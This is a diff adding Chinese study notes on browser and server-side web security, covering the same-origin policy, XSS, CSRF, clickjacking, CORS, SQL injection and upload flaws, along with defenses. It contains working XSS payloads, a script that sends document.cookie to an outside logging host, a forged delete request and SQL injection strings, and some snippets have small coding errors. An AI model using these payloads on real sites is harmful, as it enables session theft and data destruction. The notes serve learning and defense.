@@ -1,0 +1,244 @@
+同源策略是浏览器最核心，最基本的安全功能
+同源策略限制了一个源（origin）中加载文本或脚本与来自其它源（origin）中资源的交互方式。
+浏览器的同源策略，限制了来自不同源的document或脚本，对当前document获取或设置某些属性
+
+同源定义
+
+如果两个页面拥有相同的协议（protocol），端口（如果指定），和主机，那么这两个页面就属于同一个源（origin）。
+
+下表给出了相对http://store.company.com/dir/page.html同源检测的示例:
+
+URL	结果	原因
+http://store.company.com/dir2/other.html	成功
+http://store.company.com/dir/inner/another.html	成功
+https://store.company.com/secure.html	失败	协议不同
+http://store.company.com:81/dir/etc.html	失败	端口不同
+http://news.company.com/dir/other.html	失败	主机名不同
+
+可以跨域加载资源的标签：
+<script>,<img>,<link>,<iframe>,<audio>
+这些src属性的标签每次加载时，实际上是由浏览器发起了一次GET请求，不同于XHR的是通过src属性加载的内容，JS不能读、写返回的内容
+
+受同源策略的约束：DOM,cookie,XHR,flash,java applet
+
+flash:
+防范主要通过网站定义的crossdomain.xml文件判断是否允许当前源访问目标资源
+如：www.qq.com/crossdomain.xml:
+<cross-domain-policy>
+<allow-access-from domain="*.qq.com" />
+<allow-access-from domain="*.gtimg.com" />
+</cross-domain-policy>
+从origin的层面控制了Flash行为的安全性
+还可以通过检查MIME类型判断crossdomain.xml是否合法，比如通过查看服务器响应头中的Content-Typoe是否是text/*, application/xml, application/xhtml+xml；这样做是为了防范攻击者上传的crossdomain.xml控制flash的行为，绕过同源策略
+除了MIME检查，还可以检查crossdomain.xml的地址是否在网站的根目录下，可以使得一些上传文件的攻击失效
+
+IE8 CSS漏洞：
+a.com/test.html:
+<body>
+{}body{
+font-family:
+aaaa
+bhbbbb
+</body>
+
+b.com/test2.html:
+<style>
+@import url("http://www.a.com/test.html")
+</style>
+
+<script>
+setTimeout(function(){
+var t = document.body.currentStyle.fontFamily;
+alert(t)
+}, 2000);
+</script>
+在这个过程中，IE将fontFamily后面的内容当成了value，从而可以读取test.html中的内容；绕过了同源策略，成为一个跨域漏洞
+
+XSS攻击：
+跨站脚本攻击(脚本注入)，即攻击者向目标站点注入HTML标签或脚本
+例如：
+test.php:
+<?php
+echo '<div>'.$_GET('param').'</div>'
+?>
+访问/test.php?param=<script>alert(/aaa/)</script>
+
+分类：
+①反射型XSS：
+用户往往需要点击一个恶意链接才能攻击成功，也称为“非持久型XSS”
+②存储型XSS：
+会把用户输入的数据存储在服务器端，如黑客写了一篇含JavaScript恶意代码的文章，每个访问该文章的用户都会在他们的浏览器执行这段恶意代码；黑客把恶意的脚本保存在服务器端
+③DOM Based XSS:
+属于反射型XSS，通过修改页面DOM形成的XSS
+例如：
+<div id="t"></div>
+<input type="text" id="text" value="">
+<input type="button" id="s" onclick="test()">
+<script>
+function test(){
+    var str = document.getElementById('test').value;
+    document.getElementById('t').innerHTML="<a href='"+str+"'>link</a>";
+}
+</script>
+输入： ' onclick=alert(/xss/) //
+或者： '> <img src=# onerror=alert(/xss2/) /><'
+通过恶意脚本可以控制用户的浏览器，进而进行进一步的攻击，如cookie劫持：
+先加载一个远程脚本，避免在URL参数中写入大量JavaScript代码：
+' ><script src=http://aa.js></script>
+在aa.js中：
+var img = document.createElement('img');
+img.src = 'http://bb.com/log?' + escape(document.cookie);
+document.body.appendChild(img)
+escape()是编码方法，除去字母、数字和一些字符，编码后可以用unescape()解码
+拿到cookie后可以构造请求包登录页面
+
+除了劫持cookie，还可以发送get或post请求
+如插入一张图片来发送一个get请求：
+var img = document.createElement('img');
+img.src = 'http://aaa.com/a.do?m=delete&id=111'
+document.body.appendChild(img)
+如果网站只接受post请求，就可以：
+①构造一个form：
+var d = document.createElement('div');
+dd.innerHTML='<form action="" method="post" id="aa" name="myform">' +
+'<input type="hidden" value="aa" name="aaaa"/>' +
+'<input type="text" value="bb"' name="bbbb" />' +
+'</form>';
+document.body.appendChild(dd);
+document.getElementById('aa').submit();
+
+②通过XHR对象发送post请求
+
+XSS钓鱼：
+利用JS画出假登录框，将用户名和密码发送到黑客服务器上
+
+CSS历史访问hack：
+通过css来发现用户访问过的网站，原理是利用style的visited属性
+
+获取用户真实IP地址：
+一般情况下用户电脑藏在局域网的NAT后面，网站看到的客户端IP地址，是内网的出口IP地址；
+如果客户端安装了Java环境，XSS可以通过调用Java applet 接口来获取客户端的本地IP地址
+
+XSS worm:
+samy worm通过style属性构造XSS
+
+XSS构造技巧：
+①利用字符编码
+②绕过长度限制，默认注入<script></script>时，服务器可以做长度限制，这种情况可以通过onclick等事件的方式：onclick=alert(1)；
+也可以通过location.hash, 如onclick="eval(location.hash.substr(1))"；如果此时url是test.html#alert(1)则会执行；
+在默写条件下用过HTML注释去绕过，比如在两个input之间，第一个输入"><!-- ,第二个输入--><script>alert(/xss/);</script>,两个input中间的代码都会被注释掉
+③使用<base>,更改所用相对路径资源的基准地址，如<base href="http://www.aa.com" />
+<img src="/aaa/bb.jpg" /> 从而加载了位置网站上的资源
+④window.name, 使用window.name可以实现多页面传递数据，浏览器同个窗口只有一个name属性(标签间不成立)，使用该属性可以缩短XSS Payload的长度
+
+预防方式：
+
+在使用任何不可信的数据创建文档内容之前，从中移除HTML标签(主要是script标签)，比如：
+aaa = aaa. replace(/</g, "&lt;").replace(/>/g,"&gt;");
+HTML5中为iframe标签定义了一个sandbox属性，它允许显示不可信的内容，并自动禁用脚本
+
+防范XSS：
+1.CSP方法：服务器返回一个HTTP头，由于XSS攻击在没有第三方插件帮助下无法控制HTTP头，所以是可行的
+CSP方法如下：
+X-Content-Security-Policy: allow 'self' *.aaa.com
+浏览器将信任aaa.com及其子域下的内容
+又如：
+X-Content-Security-Policy: allow 'self'; img-src *; media-src media1.com; script-src aaa.com
+表示浏览器信任自身的来源、任意域的图片，来自meida1.com的媒体文件以及aaa.com的script,其他的一律拒绝
+因为CSP方法配置较为复杂，在页面较多的情况下很难一个个配置起来，所以没得到很好的推广
+
+2.浏览器XSS filter（IE 8）
+当用户访问的URL中包含了XSS攻击的脚本时，IE就会修改其中的关键字使得攻击无法完成，并向用户弹出提示框
+
+3.HttpOnly
+浏览器禁止页面的Javascript访问带有HttpOnly属性的cookie；可以通过添加http-only属性缓解XSS攻击
+
+4.输入检查，手动构造XSS filter
+客户端和服务器端都做输入检查，过滤特殊字符; 或使用HtmlEncode(),JavascriptEncode()等编码函数
+
+CSRF即跨站点请求伪造：利用已登录用户的cookie，实施恶意操作或上传用户信息到黑客服务器
+
+防御CSRF：
+①利用token，token可以是随机字符
+②验证码
+③防盗链，检查referer是否合法
+
+点击劫持：通过伪造DOM元素劫持点击事件
+防范：
+①禁止iframe的嵌套，称作frame busting：
+if (top.location != location) {
+    top.location = self.location
+}
+②使用X-Frame-Options
+当值为DENY时，浏览器拒绝加载任何frame页面；值为SAMEORIGIN则frame只能加载同个域名下的页面；值为ALLOW-FROM时可定义允许frame的加载页面地址
+
+拒绝服务攻击：例如无限弹窗或死循环计算占用CPU
+
+跨域数据存储访问
+
+存储在浏览器中的数据，如localStorage和IndexedDB，以源进行分割。每个源都拥有自己单独的存储空间，一个源中的Javascript脚本不能对属于其它源的数据进行读写操作。
+
+window.name属性可以用来临时存储数据，可以跨域访问。
+
+CORS:
+跨源资源共享标准( cross-origin sharing standard ) 使得以下场景可以使用跨站 HTTP 请求
+
+服务器返回了响应头 Access-Control-Allow-Origin: *，这表明服务器接受来自任何站点的跨站请求。如果服务器端仅允许来自 http://foo.example 的跨站请求，它可以返回：
+
+Access-Control-Allow-Origin: http://foo.example
+
+现在，除了 http://foo.example，其它站点就不能跨站访问 http://bar.other 的资源了。
+
+如上，通过使用 Origin 和 Access-Control-Allow-Origin 就可以完成最简单的跨站请求。不过 Access-Control-Allow-Origin  需要为 * 或者包含由 Origin 指明的站点。
+
+服务器响应头设置：
+Access-Control-Allow-Origin；Access-Control-Allow-Methods；Access-Control-Allow-Headers
+
+跨域脚本API访问
+
+Javascript的APIs中，如 iframe.contentWindow, window.parent, window.open 和 window.opener 允许文档间直接相互引用。当两个文档的源不同时，这些引用方式将对 Window 和 Location对象的访问添加限制。
+
+可以使用window.postMessage 作为替代方案，提供跨域文档间的通讯
+发送消息窗口：
+<iframe src="" id="aa"></iframe>
+<script>
+window.onload = function() {
+document.getElementById('aa').contentWindow.postMessage('aaa')
+}
+</script>
+
+接受消息窗口：
+<script>
+document.addEventListener('message', function(e){
+    console.log(e.data)
+})
+</script>
+使用时有两个安全问题注意：
+①必要时在接收窗口验证domain，以防止非法页面的消息
+②对收到的消息进行安全监测
+
+
+服务器端安全
+SQL注入：
+简单法：在拼接字符串后面加入;drop table ...
+盲注入法：在SQL语句后面拼接and 1=1.. or 1=1
+
+防御：
+1.过滤用户输入，使用一些escape方法，如mysql_real_escape_string()
+2.使用预编译语句：
+Java中connection.prepareStatement(query)使SQL语句的语义不会发生改变，针对or 1=1等方式，这样的字符串只会当做变量来处理
+3.使用存储过程，检查输入数据的数据类型
+4.使用安全函数等
+
+文件上传漏洞：
+出现的问题一般有：
+上传的文件是web脚本语言，服务器的web容器解释并执行了用户上传的脚本
+上传文件是flash的策略文件 crossdomain.xml，黑客可以控制flash在该域名下的行为
+上传病毒、木马文件
+上传包含了脚本的图片文件，在异乡浏览器中会被作为脚本执行，用于钓鱼和欺诈
+
+防范：
+文件上传的目录设为不可执行
+判断文件类型，可以结合MIME type,后缀检查等方式，文件类型检查时使用白名单；对于图片的处理可以使用压缩函数或resize函数
+使用随机数更改文件名和文件路径
+单独设置上传服务器的域名，可以使一些攻击失效，如crossdomain.xml.xss的问题
